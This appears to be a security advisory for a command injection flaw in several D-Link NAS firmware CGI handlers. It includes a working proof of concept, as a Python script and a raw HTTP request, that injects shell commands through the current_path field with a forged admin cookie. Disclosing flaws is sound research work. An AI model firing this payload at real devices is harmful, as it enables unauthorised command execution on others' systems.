# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)

# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_create_album function of the file /cgi-bin/photocenter_mgr.cgi.  The variable `current_path` is passed from a POST request and is assigned to `v5` via the `sprintf` function at line 41  and invoked by the `system` command,  the `shell_string_encode` function did not work  which leads to command execution.
 ![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723428930667-80b13ccd-2c5f-4664-bbbb-d1a7963c77c6.png#averageHue=%23fdfdf9&clientId=ud5f730c4-5574-4&from=paste&height=425&id=u1a349088&originHeight=593&originWidth=799&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=73142&status=done&style=none&taskId=uc6f52042-176f-4abd-b8e7-834b3bb22f3&title=&width=573.2222290039062)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/photocenter_mgr.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_create_album&current_path=%0atouch%09/tmp/777%0a&cover_name=/tmp/111&name=/tmp/333&rp=10&page=10&r=10&date=19&album_name=/tmp/"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```
POST /cgi-bin/photocenter_mgr.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Referer: http://192.168.0.32/photo_center/index.html
Cookie: username=admin
Priority: u=1

cmd=cgi_create_album&current_path=%0atouch%09/tmp/777%0a&cover_name=/tmp/111&name=/tmp/333&rp=10&page=10&r=10&date=19&album_name=/tmp/
```

